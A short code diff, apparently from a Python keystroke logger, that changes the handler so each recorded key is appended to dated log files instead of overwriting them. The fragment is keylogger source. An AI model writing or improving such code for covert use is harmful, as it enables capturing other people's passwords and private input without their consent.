@@ -20,7 +20,7 @@ def get_time():
 def on_press(key):
     key = str(key)
     now = dt.now()
-    with open(f'Logs/{now.month}/{now.day}.txt', 'w') as f:
+    with open(f'Logs/{now.month}/{now.day}.txt', 'a') as f:
         f.write(key + '\n')
         f.close()
  
